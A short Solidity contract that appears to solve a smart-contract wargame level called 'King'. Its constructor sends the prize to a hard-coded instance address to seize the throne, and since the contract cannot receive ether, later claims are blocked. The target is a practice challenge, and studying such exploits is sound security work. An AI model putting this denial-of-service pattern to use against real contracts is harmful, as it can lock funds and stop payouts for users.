//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel09.sol";

contract NewKing {
    King level9 = King(payable(0x312A2F267B6A73b2fA0A35b7404d6823B4001282));

    constructor() public payable {
        //trigger the recieve function on King contract using call with prize
        address(level9).call{value: level9.prize()}("");
    }
}
